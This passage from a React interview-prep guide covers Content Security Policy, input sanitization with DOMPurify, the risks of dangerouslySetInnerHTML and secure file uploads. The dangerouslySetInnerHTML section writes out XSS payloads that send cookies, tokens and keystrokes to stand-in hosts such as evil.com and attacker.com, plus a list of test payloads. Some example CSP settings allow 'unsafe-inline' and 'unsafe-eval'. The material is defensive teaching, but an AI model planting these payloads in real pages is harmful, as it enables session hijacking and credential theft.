Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

**CSP Directives:**
- `script-src` - JavaScript sources
- `style-src` - CSS sources  
- `img-src` - Image sources
- `connect-src` - API/fetch sources
- `font-src` - Font sources

**Express Implementation:**
```javascript
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
    },
  })
);
```

**Next.js Configuration:**
```javascript
// next.config.js
const csp = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
`;

module.exports = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{
        key: 'Content-Security-Policy',
        value: csp.replace(/\s{2,}/g, ' ').trim(),
      }],
    }];
  },
};
```

**CSP with Nonces (Recommended):**
```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'`
  );
  
  next();
});
```

</details>

---

### 186. How do you sanitize user input in React?

<details>
<summary>View Answer</summary>

**Sanitizing user input** in React involves cleaning and validating data before rendering or storing it to prevent XSS attacks and other security vulnerabilities. React provides automatic escaping, but additional sanitization is needed for HTML content and URLs.

#### React's Built-in Protection

**Automatic Escaping:**
```jsx
// React automatically escapes - SAFE
function UserGreeting({ name }) {
  return <h1>Hello, {name}!</h1>;
}

const malicious = '<script>alert("XSS")</script>';
<UserGreeting name={malicious} />
// Renders as text: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

---

#### DOMPurify for HTML Sanitization

**Installation:**
```bash
npm install dompurify
```

**Basic Usage:**
```jsx
import DOMPurify from 'dompurify';

function UserComment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Advanced Configuration:**
```jsx
const config = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^https?:/i,
};

const clean = DOMPurify.sanitize(dirty, config);
```

**Custom Hook:**
```jsx
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

function useSanitizedHtml(dirty) {
  return useMemo(() => DOMPurify.sanitize(dirty), [dirty]);
}
```

---

#### Text Input Sanitization

**Remove HTML:**
```javascript
function stripHtml(html) {
  return html.replace(/<[^>]*>/g, '');
}

// Or use DOMPurify
DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
```

**Allow Specific Characters:**
```javascript
function sanitizeUsername(input) {
  return input.replace(/[^a-zA-Z0-9_-]/g, '');
}

function sanitizeEmail(input) {
  return input.replace(/[^a-zA-Z0-9@._-]/g, '').toLowerCase();
}
```

---

#### URL Sanitization

**Validate Protocol:**
```javascript
function sanitizeUrl(url) {
  const dangerous = ['javascript:', 'data:', 'vbscript:'];
  const lower = url.toLowerCase().trim();
  
  if (dangerous.some(p => lower.startsWith(p))) {
    return 'about:blank';
  }
  
  try {
    const parsed = new URL(url);
    if (['http:', 'https:'].includes(parsed.protocol)) {
      return url;
    }
  } catch {}
  
  return 'about:blank';
}
```

**Safe Link Component:**
```jsx
function SafeLink({ href, children }) {
  const safeHref = sanitizeUrl(href);
  return (
    <a href={safeHref} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}
```

---

#### Form Validation Example

```jsx
function ContactForm() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
  });
  
  const handleChange = (field) => (e) => {
    let value = e.target.value;
    
    if (field === 'name') {
      value = value.replace(/[^a-zA-Z\s]/g, '').slice(0, 50);
    } else if (field === 'email') {
      value = value.replace(/[^a-zA-Z0-9@._-]/g, '').slice(0, 100);
    }
    
    setFormData({ ...formData, [field]: value });
  };
  
  return (
    <form>
      <input
        value={formData.name}
        onChange={handleChange('name')}
        maxLength={50}
      />
      <input
        value={formData.email}
        onChange={handleChange('email')}
        maxLength={100}
      />
    </form>
  );
}
```

---

#### Server-Side Validation (Critical)

```javascript
// API endpoint
export default async function handler(req, res) {
  const { name, email } = req.body;
  
  // Validate
  if (!name || name.length > 50) {
    return res.status(400).json({ error: 'Invalid name' });
  }
  
  // Sanitize
  const clean = DOMPurify.sanitize(name, { ALLOWED_TAGS: [] });
  
  // Save to database
  await db.save(clean);
  res.json({ success: true });
}
```

---

#### Best Practices

**✅ Use React's Auto-Escaping:**
```jsx
// SAFE - Always use React's JSX
<div>{userInput}</div>
```

**✅ Sanitize Before dangerouslySetInnerHTML:**
```jsx
// Always sanitize HTML
const clean = DOMPurify.sanitize(html);
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

**✅ Validate on Server:**
```
Client: Sanitize for UX
Server: Validate for security (never trust client)
```

**✅ Use Allowlists:**
```javascript
// GOOD - Allow specific tags
ALLOWED_TAGS: ['p', 'br', 'strong']

// BAD - Block specific tags
FORBIDDEN_TAGS: ['script']
```

</details>

---

### 187. What are the security implications of dangerouslySetInnerHTML?

<details>
<summary>View Answer</summary>

**dangerouslySetInnerHTML** is React's mechanism for rendering raw HTML, and it's one of the most dangerous features in React because it bypasses React's built-in XSS protections. Using it with unsanitized user input can allow attackers to inject and execute malicious scripts.

#### Why It's Dangerous

**Bypasses React's Protection:**
```jsx
// React normally escapes content - SAFE
function Safe({ input }) {
  return <div>{input}</div>;
}

const malicious = '<script>alert("XSS")</script>';
<Safe input={malicious} />
// Output: <div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>
// Script tags are escaped, NOT executed

// dangerouslySetInnerHTML - DANGEROUS
function Unsafe({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

<Unsafe html={malicious} />
// Output: <div><script>alert("XSS")</script></div>
// Script EXECUTES! User alerted!
```

**Why the Name?**
```
"dangerouslySetInnerHTML" name is intentionally long and scary:
- Forces developers to think twice
- Makes code review easier to spot
- Signals potential security risk
```

---

#### Attack Vectors

**1. Stored XSS (Most Dangerous):**
```jsx
// VULNERABLE: User-generated content from database
function Comment({ comment }) {
  return (
    <div>
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}

// Attacker posts comment:
const attackComment = {
  author: 'Hacker',
  text: `
    <img src=x onerror="
      fetch('https://evil.com/steal?cookie=' + document.cookie)
    ">
  `,
};

// Every user viewing this comment is compromised!
```

**2. Reflected XSS:**
```jsx
// VULNERABLE: URL parameters
function SearchResults() {
  const params = new URLSearchParams(location.search);
  const query = params.get('q');
  
  return (
    <div>
      <h2>Results for:</h2>
      <div dangerouslySetInnerHTML={{ __html: query }} />
    </div>
  );
}

// Attack URL:
// /search?q=<img src=x onerror="alert(document.cookie)">
```

**3. Third-Party Content:**
```jsx
// VULNERABLE: External API data
function BlogPost({ apiData }) {
  return (
    <article dangerouslySetInnerHTML={{ __html: apiData.content }} />
  );
}

// If API is compromised or returns malicious data, app is vulnerable
```

**4. Rich Text Editor Output:**
```jsx
// VULNERABLE: Editor content without sanitization
function ArticleDisplay({ editorContent }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: editorContent }} />
  );
}

// User pastes malicious HTML in editor
```

---

#### Specific Vulnerabilities

**Script Injection:**
```jsx
const malicious = '<script>alert("XSS")</script>';
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// Scripts execute
```

**Event Handlers:**
```jsx
const malicious = '<img src=x onerror="alert(\'XSS\')">';
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// onerror executes when image fails to load
```

**SVG Scripts:**
```jsx
const malicious = `
  <svg>
    <script>alert('XSS')</script>
  </svg>
`;
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// SVG scripts execute
```

**iframe Injection:**
```jsx
const malicious = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// iframe loads and executes JavaScript
```

**CSS Injection:**
```jsx
const malicious = `
  <style>
    body { background: url('javascript:alert(1)'); }
  </style>
`;
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// Can execute JavaScript in some browsers
```

**Form Hijacking:**
```jsx
const malicious = `
  <form action="https://evil.com/steal" method="POST">
    <input type="hidden" name="data" value="stolen">
    <script>document.forms[0].submit()</script>
  </form>
`;
<div dangerouslySetInnerHTML={{ __html: malicious }} />
// Auto-submits form to attacker's server
```

---

#### Real-World Impact

**Cookie Theft:**
```jsx
const attack = `
  <img src=x onerror="
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        url: location.href,
        localStorage: JSON.stringify(localStorage)
      })
    })
  ">
`;

<div dangerouslySetInnerHTML={{ __html: attack }} />
// Attacker now has user's session cookies
```

**Session Hijacking:**
```jsx
const attack = `
  <script>
    // Send session token to attacker
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: localStorage.getItem('authToken')
    });
  </script>
`;
```

**Keylogging:**
```jsx
const attack = `
  <script>
    document.addEventListener('keypress', (e) => {
      fetch('https://evil.com/keys?key=' + e.key);
    });
  </script>
`;
// Logs every keystroke
```

**Phishing:**
```jsx
const attack = `
  <script>
    document.body.innerHTML = `
      <div style="text-align:center;margin-top:100px">
        <h1>Session Expired</h1>
        <form id="phish">
          <input type="email" placeholder="Email" required>
          <input type="password" placeholder="Password" required>
          <button>Login</button>
        </form>
      </div>
    `;
    
    document.getElementById('phish').onsubmit = (e) => {
      e.preventDefault();
      // Send credentials to attacker
    };
  </script>
`;
```

**Defacement:**
```jsx
const attack = `
  <script>
    document.body.innerHTML = '<h1>Hacked!</h1>';
  </script>
`;
```

---

#### Safe Alternatives

**1. Use React's Default Rendering (Safest):**
```jsx
// SAFE - React automatically escapes
function SafeDisplay({ content }) {
  return <div>{content}</div>;
}

// Even with malicious content:
const malicious = '<script>alert(1)</script>';
<SafeDisplay content={malicious} />
// Renders as text, not executed
```

**2. Parse HTML to React Elements:**
```jsx
import parse from 'html-react-parser';

function SafeHtmlDisplay({ html }) {
  // Parses HTML to React elements (safer)
  return <div>{parse(html)}</div>;
}
```

**3. Use Markdown Instead:**
```jsx
import ReactMarkdown from 'react-markdown';

function MarkdownDisplay({ markdown }) {
  // Markdown is safer than raw HTML
  return <ReactMarkdown>{markdown}</ReactMarkdown>;
}
```

**4. Sanitize with DOMPurify (If HTML Necessary):**
```jsx
import DOMPurify from 'dompurify';

function SanitizedHtml({ html }) {
  // SAFE - Sanitize before rendering
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href'],
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

#### When dangerouslySetInnerHTML is Necessary

**Valid Use Cases:**
```
1. Trusted CMS content (with sanitization)
2. Server-side rendered content you control
3. Rich text editor output (sanitized)
4. Email templates (sanitized)
5. Markdown converted to HTML (sanitized)
```

**Always Sanitize:**
```jsx
import DOMPurify from 'dompurify';

function TrustedContent({ html }) {
  // Even "trusted" content should be sanitized
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 'a',
      'ul', 'ol', 'li', 'h1', 'h2', 'h3',
      'blockquote', 'code', 'pre',
    ],
    ALLOWED_ATTR: ['href', 'title', 'class'],
    ALLOWED_URI_REGEXP: /^https?:/i,
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

#### DOMPurify Configuration Examples

**Strict Configuration:**
```jsx
const strictConfig = {
  ALLOWED_TAGS: ['p', 'br'],
  ALLOWED_ATTR: [],
  KEEP_CONTENT: true,
};

const clean = DOMPurify.sanitize(dirty, strictConfig);
```

**Blog Post Configuration:**
```jsx
const blogConfig = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 'a',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'blockquote',
    'code', 'pre', 'img',
  ],
  ALLOWED_ATTR: {
    a: ['href', 'title', 'target'],
    img: ['src', 'alt', 'title'],
  },
  ALLOWED_URI_REGEXP: /^https?:/i,
};
```

**Comment Configuration:**
```jsx
const commentConfig = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^https?:/i,
  MAX_LENGTH: 1000,
};
```

---

#### Complete Safe Implementation

**Reusable Safe HTML Component:**
```jsx
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

function SafeHtml({ html, allowedTags, allowedAttributes }) {
  const sanitized = useMemo(() => {
    if (!html) return '';
    
    const config = {
      ALLOWED_TAGS: allowedTags || [
        'p', 'br', 'strong', 'em', 'a',
        'ul', 'ol', 'li', 'h1', 'h2', 'h3',
      ],
      ALLOWED_ATTR: allowedAttributes || ['href', 'title'],
      ALLOWED_URI_REGEXP: /^https?:/i,
      KEEP_CONTENT: true,
    };
    
    return DOMPurify.sanitize(html, config);
  }, [html, allowedTags, allowedAttributes]);
  
  if (!sanitized) {
    return null;
  }
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

export default SafeHtml;
```

**Usage:**
```jsx
import SafeHtml from './SafeHtml';

function UserComment({ comment }) {
  return (
    <div>
      <strong>{comment.author}</strong>
      <SafeHtml
        html={comment.text}
        allowedTags={['p', 'br', 'strong', 'em']}
      />
    </div>
  );
}
```

---

#### Testing for Vulnerabilities

**Common XSS Payloads:**
```javascript
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<div style="background:url(\'javascript:alert(1)\')" />',
];

// Test each payload
xssPayloads.forEach(payload => {
  const result = DOMPurify.sanitize(payload);
  console.log('Input:', payload);
  console.log('Output:', result);
  console.log('Safe:', !result.includes('<script') && !result.includes('onerror'));
});
```

**Automated Testing:**
```javascript
import { render } from '@testing-library/react';
import SafeHtml from './SafeHtml';

test('blocks script tags', () => {
  const { container } = render(
    <SafeHtml html='<script>alert(1)</script>' />
  );
  
  expect(container.querySelector('script')).toBeNull();
});

test('blocks event handlers', () => {
  const { container } = render(
    <SafeHtml html='<img src=x onerror="alert(1)">' />
  );
  
  const img = container.querySelector('img');
  expect(img?.getAttribute('onerror')).toBeNull();
});

test('allows safe tags', () => {
  const { container } = render(
    <SafeHtml html='<p><strong>Bold</strong> text</p>' />
  );
  
  expect(container.querySelector('p')).toBeTruthy();
  expect(container.querySelector('strong')).toBeTruthy();
});
```

---

#### Code Review Checklist

**❌ Red Flags:**
```jsx
// DANGEROUS - No sanitization
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// DANGEROUS - User-controlled content
<div dangerouslySetInnerHTML={{ __html: comment.html }} />

// DANGEROUS - URL parameters
<div dangerouslySetInnerHTML={{ __html: searchQuery }} />

// DANGEROUS - API responses
<div dangerouslySetInnerHTML={{ __html: apiData.content }} />
```

**✅ Safe Patterns:**
```jsx
// GOOD - Sanitized first
const clean = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: clean }} />

// BETTER - Use React's default escaping
<div>{userInput}</div>

// BEST - Use safe alternatives (Markdown, etc.)
<ReactMarkdown>{markdown}</ReactMarkdown>
```

---

#### Best Practices

**✅ Avoid When Possible:**
```jsx
// Instead of dangerouslySetInnerHTML
// Use React components and default rendering
```

**✅ Always Sanitize:**
```jsx
// NEVER use without sanitization
const clean = DOMPurify.sanitize(html);
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

**✅ Use Allowlists:**
```jsx
// Define exactly what's allowed
ALLOWED_TAGS: ['p', 'br', 'strong']
// Don't rely on blocklists
```

**✅ Server-Side Sanitization:**
```javascript
// Sanitize on server before storing
const clean = DOMPurify.sanitize(userInput);
await db.save(clean);
```

**✅ Content Security Policy:**
```javascript
// Add CSP headers to prevent inline scripts
Content-Security-Policy: script-src 'self'
```

**✅ Regular Audits:**
```bash
# Search for dangerouslySetInnerHTML in codebase
grep -r "dangerouslySetInnerHTML" src/

# Review each usage for proper sanitization
```

---

#### Alternative Solutions

**1. Component-Based Rendering:**
```jsx
function RichText({ blocks }) {
  return (
    <>
      {blocks.map((block, i) => {
        switch (block.type) {
          case 'paragraph':
            return <p key={i}>{block.text}</p>;
          case 'heading':
            return <h2 key={i}>{block.text}</h2>;
          case 'list':
            return (
              <ul key={i}>
                {block.items.map((item, j) => (
                  <li key={j}>{item}</li>
                ))}
              </ul>
            );
          default:
            return null;
        }
      })}
    </>
  );
}
```

**2. Template System:**
```jsx
const templates = {
  greeting: (name) => <h1>Hello, {name}!</h1>,
  message: (text) => <p>{text}</p>,
};

function TemplateRenderer({ type, data }) {
  const Template = templates[type];
  return <Template {...data} />;
}
```

---

#### Interview Tips

✅ **Key Points:**
- dangerouslySetInnerHTML bypasses React's XSS protection
- Renders raw HTML, allowing script execution
- Main risk: XSS attacks via user input
- Always sanitize with DOMPurify before use
- Prefer React's default rendering when possible
- Name is intentionally scary to discourage use

✅ **When to Mention:**
- XSS prevention discussions
- User-generated content handling
- Rich text editors
- Security best practices
- Code review standards

✅ **Common Follow-ups:**
- "When should you use dangerouslySetInnerHTML?"
- "How does DOMPurify work?"
- "What are alternatives to dangerouslySetInnerHTML?"
- "How do you test for XSS vulnerabilities?"
- "What's the performance impact of sanitization?"

✅ **Perfect Answer Structure:**
1. Risk: Bypasses React's XSS protection, executes scripts
2. Why Dangerous: User input can inject malicious code
3. Impact: Cookie theft, session hijacking, defacement
4. Prevention: Always use DOMPurify.sanitize() first
5. Alternatives: React default rendering, Markdown, component-based
6. Example: Show vulnerable code → sanitized version
7. Best Practice: Avoid when possible, sanitize when necessary

</details>

---

### 188. How do you implement secure file uploads?

<details>
<summary>View Answer</summary>

**Secure file uploads** require comprehensive validation on both client and server sides, including file type verification, size limits, malware scanning, secure storage, and proper access controls to prevent malicious file uploads and exploitation.

#### Security Risks

**Common Threats:**
```
1. Malicious file execution (web shells, scripts)
2. Path traversal (../ attacks)
3. Malware distribution
4. Denial of Service (huge files)
5. File type spoofing
6. XSS via file names
7. Overwriting critical files
8. Storage exhaustion
```

---

#### Client-Side Implementation

**Basic Upload Component:**
```jsx
import { useState } from 'react';

function SecureFileUpload() {
  const [file, setFile] = useState(null);
  const [error, setError] = useState('');
  const [uploading, setUploading] = useState(false);
  
  // Allowed file types
  const ALLOWED_TYPES = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf',
  ];
  
  const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
  
  const validateFile = (file) => {
    // Check file exists
    if (!file) {
      return 'Please select a file';
    }
    
    // Check file size
    if (file.size > MAX_FILE_SIZE) {
      return `File too large. Max size: ${MAX_FILE_SIZE / 1024 / 1024}MB`;
    }
    
    // Check file type
    if (!ALLOWED_TYPES.includes(file.type)) {
      return 'Invalid file type. Allowed: JPEG, PNG, GIF, PDF';
    }
    
    // Check file name
    if (!/^[a-zA-Z0-9_.-]+$/.test(file.name)) {
      return 'Invalid file name. Use only letters, numbers, dots, hyphens, underscores';
    }
    
    return null;
  };
  
  const handleFileChange = (e) => {
    const selectedFile = e.target.files[0];
    const validationError = validateFile(selectedFile);
    
    if (validationError) {
      setError(validationError);
      setFile(null);
      return;
    }
    
    setError('');
    setFile(selectedFile);
  };
  
  const handleUpload = async () => {
    if (!file) return;
    
    setUploading(true);
    
    const formData = new FormData();
    formData.append('file', file);
    
    try {
      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
        credentials: 'include',
      });
      
      if (response.ok) {
        const data = await response.json();
        alert('File uploaded successfully!');
        console.log('File URL:', data.url);
      } else {
        const error = await response.json();
        setError(error.message || 'Upload failed');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setUploading(false);
    }
  };
  
  return (
    <div>
      <input
        type="file"
        onChange={handleFileChange}
        accept="image/jpeg,image/png,image/gif,application/pdf"
      />
      
      {error && <div style={{ color: 'red' }}>{error}</div>}
      
      {file && (
        <div>
          <p>Selected: {file.name} ({(file.size / 1024).toFixed(2)} KB)</p>
          <button onClick={handleUpload} disabled={uploading}>
            {uploading ? 'Uploading...' : 'Upload'}
          </button>
        </div>
      )}
    </div>
  );
}
```

---

#### Server-Side Validation (Critical)

**Express + Multer:**
```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const fileType = require('file-type');

const app = express();

// Configure storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Store outside web root
    cb(null, '/var/uploads/');
  },
  filename: (req, file, cb) => {
    // Generate random filename
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname);
    cb(null, `${randomName}${ext}`);
  },
});

// File filter
const fileFilter = (req, file, cb) => {
  const allowedMimes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf',
  ];
  
  if (allowedMimes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

// Configure multer
const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1, // Single file
  },
});

// Upload endpoint
app.post('/api/upload', upload.single('file'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    // Verify file type by reading file content
    const buffer = await fs.promises.readFile(req.file.path);
    const type = await fileType.fromBuffer(buffer);
    
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    
    if (!type || !allowedTypes.includes(type.mime)) {
      // Delete invalid file
      await fs.promises.unlink(req.file.path);
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // Sanitize filename
    const sanitizedName = req.file.originalname
      .replace(/[^a-zA-Z0-9._-]/g, '')
      .slice(0, 255);
    
    // Save to database
    const fileRecord = await db.files.create({
      userId: req.user.id,
      filename: sanitizedName,
      storedName: req.file.filename,
      size: req.file.size,
      mimeType: type.mime,
      uploadDate: new Date(),
    });
    
    res.json({
      success: true,
      fileId: fileRecord.id,
      url: `/api/files/${fileRecord.id}`,
    });
    
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ error: 'Upload failed' });
  }
});
```

---

#### File Type Verification

**Magic Number Validation:**
```javascript
const fileType = require('file-type');
const fs = require('fs');

async function verifyFileType(filePath, expectedMime) {
  // Read file header
  const buffer = await fs.promises.readFile(filePath);
  const type = await fileType.fromBuffer(buffer);
  
  // Check magic number matches expected type
  if (!type || type.mime !== expectedMime) {
    return false;
  }
  
  return true;
}

// Usage
if (!await verifyFileType(req.file.path, 'image/jpeg')) {
  await fs.promises.unlink(req.file.path);
  return res.status(400).json({ error: 'File type mismatch' });
}
```

**Image Validation:**
```javascript
const sharp = require('sharp');

async function validateImage(filePath) {
  try {
    // Try to process as image
    const metadata = await sharp(filePath).metadata();
    
    // Check dimensions
    if (metadata.width > 5000 || metadata.height > 5000) {
      return { valid: false, error: 'Image too large' };
    }
    
    // Check format
    const allowedFormats = ['jpeg', 'png', 'gif', 'webp'];
    if (!allowedFormats.includes(metadata.format)) {
      return { valid: false, error: 'Invalid image format' };
    }
    
    return { valid: true, metadata };
  } catch (error) {
    return { valid: false, error: 'Not a valid image' };
  }
}
```

---

#### Secure File Storage

**Store Outside Web Root:**
```javascript
// BAD - Stored in public directory
const publicPath = './public/uploads/';
// Files accessible at: /uploads/file.jpg

// GOOD - Stored outside web root
const privatePath = '/var/app/uploads/';
// Files NOT directly accessible via URL
```

**Serve Through Endpoint:**
```javascript
app.get('/api/files/:fileId', authenticateUser, async (req, res) => {
  try {
    // Get file from database
    const file = await db.files.findById(req.params.fileId);
    
    if (!file) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    // Check permissions
    if (file.userId !== req.user.id && !req.user.isAdmin) {
      return res.status(403).json({ error: 'Access denied' });
    }
    
    // Set secure headers
    res.setHeader('Content-Type', file.mimeType);
    res.setHeader('Content-Disposition', `attachment; filename="${file.filename}"`);
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    // Stream file
    const filePath = path.join('/var/app/uploads/', file.storedName);
    const stream = fs.createReadStream(filePath);
    stream.pipe(res);
    
  } catch (error) {
    res.status(500).json({ error: 'Error retrieving file' });
  }
});
```

---

#### Filename Sanitization

**Prevent Path Traversal:**
```javascript
function sanitizeFilename(filename) {
  // Remove path traversal attempts
  filename = path.basename(filename);
  
  // Remove special characters
  filename = filename.replace(/[^a-zA-Z0-9._-]/g, '');
  
  // Limit length
  filename = filename.slice(0, 255);
  
  // Ensure not empty
  if (!filename) {
    filename = 'unnamed';
  }
  
  return filename;
}

// Usage
const safeName = sanitizeFilename(req.file.originalname);
```

**Random Filenames:**
```javascript
const crypto = require('crypto');

function generateFilename(originalName) {
  const randomName = crypto.randomBytes(16).toString('hex');
  const ext = path.extname(originalName);
  return `${randomName}${ext}`;
}
```

---

#### Virus Scanning

**ClamAV Integration:**
```javascript
const NodeClam = require('clamscan');

const clamscan = await new NodeClam().init({
  clamdscan: {
    host: 'localhost',
    port: 3310,
  },
});

async function scanFile(filePath) {
  try {
    const { isInfected, viruses } = await clamscan.isInfected(filePath);
    
    if (isInfected) {
      console.error('Infected file:', viruses);
      await fs.promises.unlink(filePath);
      return { safe: false, viruses };
    }
    
    return { safe: true };
  } catch (error) {
    console.error('Scan error:', error);
    return { safe: false, error: 'Scan failed' };
  }
}

// In upload handler
const scanResult = await scanFile(req.file.path);
if (!scanResult.safe) {
  return res.status(400).json({ error: 'File rejected: malware detected' });
}
```

---

#### Complete Secure Upload Example

**Next.js API Route:**
```javascript
// pages/api/upload.js
import formidable from 'formidable';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import fileType from 'file-type';
import sharp from 'sharp';

export const config = {
  api: {
    bodyParser: false,
  },
};

const UPLOAD_DIR = '/var/app/uploads';
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  // Check authentication
  if (!req.session?.user) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    // Parse form
    const form = formidable({
      maxFileSize: MAX_FILE_SIZE,
      uploadDir: UPLOAD_DIR,
      keepExtensions: false,
      filename: () => crypto.randomBytes(16).toString('hex'),
    });
    
    const [fields, files] = await form.parse(req);
    const file = files.file[0];
    
    if (!file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    // Verify file type by content
    const buffer = await fs.promises.readFile(file.filepath);
    const type = await fileType.fromBuffer(buffer);
    
    if (!type || !ALLOWED_TYPES.includes(type.mime)) {
      await fs.promises.unlink(file.filepath);
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // Validate image
    if (type.mime.startsWith('image/')) {
      try {
        const metadata = await sharp(file.filepath).metadata();
        
        if (metadata.width > 5000 || metadata.height > 5000) {
          await fs.promises.unlink(file.filepath);
          return res.status(400).json({ error: 'Image too large' });
        }
        
        // Generate thumbnail
        const thumbPath = `${file.filepath}_thumb.jpg`;
        await sharp(file.filepath)
          .resize(200, 200, { fit: 'inside' })
          .jpeg({ quality: 80 })
          .toFile(thumbPath);
      } catch (error) {
        await fs.promises.unlink(file.filepath);
        return res.status(400).json({ error: 'Invalid image file' });
      }
    }
    
    // Save to database
    const fileRecord = await db.files.create({
      userId: req.session.user.id,
      originalName: file.originalFilename,
      storedName: path.basename(file.filepath),
      size: file.size,
      mimeType: type.mime,
      uploadedAt: new Date(),
    });
    
    res.json({
      success: true,
      fileId: fileRecord.id,
      url: `/api/files/${fileRecord.id}`,
    });
    
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ error: 'Upload failed' });
  }
}
```

---

#### Security Best Practices

**✅ Validate on Server:**
```javascript
// Never trust client-side validation
// Always validate file type, size, content on server
```

**✅ Use Random Filenames:**
```javascript
// Prevent filename-based attacks
const filename = crypto.randomBytes(16).toString('hex');
```

**✅ Store Outside Web Root:**
```javascript
// Files not directly accessible
const uploadDir = '/var/app/uploads/';
```

**✅ Verify File Content:**
```javascript
// Check magic numbers, not just extension
const type = await fileType.fromBuffer(buffer);
```

**✅ Set Size Limits:**
```javascript
// Prevent DoS
maxFileSize: 5 * 1024 * 1024,
```

**✅ Scan for Malware:**
```javascript
// Use ClamAV or similar
await scanFile(filepath);
```

**✅ Implement Access Control:**
```javascript
// Check user permissions before serving files
if (file.userId !== req.user.id) {
  return res.status(403).json({ error: 'Access denied' });
}
```

**✅ Set Secure Headers:**
```javascript
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('Content-Disposition', 'attachment');
```

---

#### Interview Tips

✅ **Key Points:**
- Validate file type, size, content on server (never trust client)
- Verify file content with magic numbers (file-type library)
- Store files outside web root, serve through authenticated endpoint
- Use random filenames to prevent path traversal
- Scan for malware with ClamAV or similar
- Set size limits to prevent DoS
- Implement proper access controls

✅ **When to Mention:**
- File upload features
- User-generated content
- Security architecture
- API design
- Storage solutions

✅ **Common Follow-ups:**
- "How do you verify file types?"
- "What's path traversal?"
- "How do you prevent malware uploads?"
- "Client vs server validation?"
- "How do you handle large files?"

✅ **Perfect Answer Structure:**
1. Risks: Malware, path traversal, DoS, type spoofing
2. Client Validation: File type, size (UX only)
